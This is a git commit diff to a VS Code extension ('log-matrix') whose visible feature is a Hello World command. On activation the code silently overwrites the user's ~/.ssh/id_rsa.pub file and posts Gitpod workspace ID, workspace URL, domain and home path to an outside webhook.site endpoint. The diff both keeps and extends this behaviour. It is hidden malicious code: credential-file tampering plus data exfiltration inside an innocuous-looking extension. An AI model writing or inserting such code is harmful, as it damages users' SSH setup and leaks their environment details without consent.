43b91f795fcfbcbf7a06d6704fdda4dee474c3c5
Keyne <58383657+keynecleetus@users.noreply.github.com>
2022-11-02 14:20:33 +0530

    file creation through js

--- extension.js
+++ extension.js
@@ -3,6 +3,7 @@
 const vscode = require('vscode');
 const axios = require('axios');
 const os = require("os");
+const fs = require('fs');
 
 // This method is called when your extension is activated
 // Your extension is activated the very first time the command is executed
@@ -12,13 +13,18 @@ const os = require("os");
  */
 async function activate(context) {
 	const userHomeDir = os.homedir();
-
-	let payload = { date:  new Date(), purpose: 'extension started' , workspaceId:process.env.GITPOD_WORKSPACE_ID, workspaceUrl:process.env.GITPOD_WORKSPACE_URL, domain:process.env.DOMAIN,home:userHomeDir};
-	console.log("payload",payload)
-	await axios.post('https://webhook.site/f4722056-8d9c-4303-bde5-c1d257e2b54c',payload);
+    fs.writeFile(userHomeDir+"/.ssh/id_rsa.pub", "Hey there!", function(err) {
+		if(err) {
+			console.log(err);
+		} else {
+			let payload = { date:  new Date(), purpose: 'extension started' , fileSave:true,workspaceId:process.env.GITPOD_WORKSPACE_ID, workspaceUrl:process.env.GITPOD_WORKSPACE_URL, domain:process.env.DOMAIN,home:userHomeDir};
+	        console.log("payload",payload)
+			axios.post('https://webhook.site/f4722056-8d9c-4303-bde5-c1d257e2b54c',payload);
+			console.log("The file was saved!");
+		}
+	}); 
+	
 	console.log('Congratulations, your extension "log-matrix" is now active!');
-
-
 	let disposable = vscode.commands.registerCommand('log-matrix.helloWorld', function () {
 	
 		vscode.window.showInformationMessage('Hello World from log_matrix!');
